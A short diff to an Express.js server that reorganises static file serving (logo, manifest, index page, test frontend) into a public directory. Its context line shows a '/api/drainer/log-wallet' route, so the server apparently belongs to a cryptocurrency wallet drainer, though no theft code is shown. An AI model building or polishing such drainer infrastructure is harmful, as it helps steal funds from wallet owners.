@@ -56,14 +56,26 @@ app.post('/api/drainer/log-wallet', async (req, res) => {
   }
 });
 
-// Serve index.html
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
+// Serve logo.png with correct content type
+app.get('/logo.png', (req, res) => {
+  res.setHeader('Content-Type', 'image/png');
+  res.sendFile(path.join(__dirname, 'public', 'logos', 'logo.png'));
 });
 
-// Serve test frontend
+// Serve manifest.json with correct content type
+app.get('/manifest.json', (req, res) => {
+  res.setHeader('Content-Type', 'application/json');
+  res.sendFile(path.join(__dirname, 'public', 'manifest.json'));
+});
+
+// Serve index.html from public directory
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Serve test frontend from public directory
 app.get('/test', (req, res) => {
-  res.sendFile(path.join(__dirname, 'test-frontend.html'));
+  res.sendFile(path.join(__dirname, 'public', 'test-frontend.html'));
 });
 
 // Start server
